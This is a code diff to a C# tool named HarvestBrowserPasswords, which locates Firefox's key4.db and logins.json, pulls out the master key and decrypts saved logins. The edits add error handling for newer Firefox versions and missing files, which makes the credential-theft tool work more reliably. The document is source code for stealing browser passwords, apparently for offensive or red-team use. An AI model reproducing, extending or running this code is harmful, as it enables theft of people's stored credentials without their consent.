@@ -35,7 +35,19 @@ namespace HarvestBrowserPasswords
                 Console.ForegroundColor = ConsoleColor.Green;
                 Console.WriteLine($"[+] Found Firefox credential database at: \"{Key4dbpath}\"");
                 Console.ResetColor();
-                Key4DatabaseConnection(Key4dbpath);
+
+                // If Firefox version >= 75.0, asn.1 parser will throw IndexOutOfRange exception when trying to parse encrypted data as asn.1 DER encoded
+                try
+                {
+                    Key4DatabaseConnection(Key4dbpath);
+                }
+                catch(IndexOutOfRangeException e)
+                {
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine($"[-] Could not correctly parse the contents of {Key4dbpath} - possibly incorrect Firefox version.");
+                    Console.ResetColor();
+                }
+                
 
                 //Store a RootObject from FirefoxLoginsJSON (hopefully) containing multiple FirefoxLoginsJSON.Login instances
                 FirefoxLoginsJSON.Rootobject JSONLogins = GetJSONLogins(ProfileDir);
@@ -102,11 +114,19 @@ namespace HarvestBrowserPasswords
         public FirefoxLoginsJSON.Rootobject GetJSONLogins(string profileDir)
         {
 
-            //Read logins.json from file and deserialise JSON into FirefoxLoginsJson object
-            string file = File.ReadAllText(profileDir + @"\logins.json");
-            FirefoxLoginsJSON.Rootobject JSONLogins = JsonConvert.DeserializeObject<FirefoxLoginsJSON.Rootobject>(file);
+            if (File.Exists(profileDir + @"\logins.json"))
+            {
+                //Read logins.json from file and deserialise JSON into FirefoxLoginsJson object
+                string file = File.ReadAllText(profileDir + @"\logins.json");
+                FirefoxLoginsJSON.Rootobject JSONLogins = JsonConvert.DeserializeObject<FirefoxLoginsJSON.Rootobject>(file);
 
-            return JSONLogins;
+                return JSONLogins;
+            }
+            else
+            {
+                throw new FileNotFoundException($"Could not find file '{profileDir}\\logins.json.\nUnable to decrypt logins for this profile.'");
+            }
+            
         }
 
         public void Key4DatabaseConnection(string key4dbPath)
@@ -155,10 +175,16 @@ namespace HarvestBrowserPasswords
                     CipherText3DESKey = masterKeyASN1.RootSequence.Sequences[0].Sequences[0].Sequences[0].OctetStrings[1];
                 }
             }
+            catch (IndexOutOfRangeException)
+            {
+                 
+                throw new IndexOutOfRangeException();
+            }
             catch (Exception e)
             {
                 Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine($"Exception: {e}");
+                Console.WriteLine($"[-] {e.Message}");
+                Console.ResetColor();
             }
             finally
             {
@@ -284,7 +310,7 @@ namespace HarvestBrowserPasswords
             catch (Exception e)
             {
                 Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine($"Exception: {e}");
+                Console.WriteLine($"[-] {e.Message}");
                 Console.ResetColor();
             }
             return decryptedResult;
